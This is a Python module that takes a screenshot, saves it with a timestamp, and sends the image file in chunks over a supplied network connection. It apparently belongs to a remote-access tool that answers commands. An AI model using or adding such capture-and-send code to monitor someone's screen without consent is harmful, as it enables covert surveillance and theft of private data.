import pyautogui
import os
import calendar
import time

class Screenshots:

    def __init__(self):
        self = self

    def take_and_save(self, nt):
        s = pyautogui.screenshot() # Take screenshot
        path = os.getcwd() # Get location Path
        directory = "\captures\\" # Custom directory
        ts = path+directory+str(calendar.timegm(time.gmtime())) # Get timesmap for naming the images
        ts +=".png"
        s.save(ts) # Save images
        self.sendFile(ts, nt)
        return "taked\r\n"

    # used to send files
    def sendFile(self, ts, nt):
        filename = ts # timestamp file
        f = open(ts, "rb") # open the file
        l = f.read(1024) # read the file
        while (l):
            nt.connectionSend(l) # send the content of the file
            l = f.read(1024) # read more data
        f.close() # close the file
        nt.connectionClose() # close the connection